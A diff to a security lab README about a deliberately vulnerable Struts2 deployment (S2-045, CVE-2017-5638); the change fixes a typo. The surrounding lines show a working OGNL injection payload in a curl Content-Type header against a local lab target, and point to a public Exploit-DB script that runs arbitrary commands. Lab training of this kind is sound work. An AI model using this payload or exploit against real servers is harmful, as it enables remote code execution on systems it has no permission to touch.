@@ -28,7 +28,7 @@ In this lab, you will deployed a Vulnerable Struts2 workload (S2-045 / CVE-2017-
 
 `curl -v -X POST -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',668.5*2)}.multipart/form-data" http://localhost:30080`
 
-- Alternatively you may use ExplpoitDB's python esploit @ `https://www.exploit-db.com/exploits/41570`
+- Alternatively you may use ExplpoitDB's python exploit @ `https://www.exploit-db.com/exploits/41570`
   Usage: `python2 <script> <url> <command>`
 
 -----------
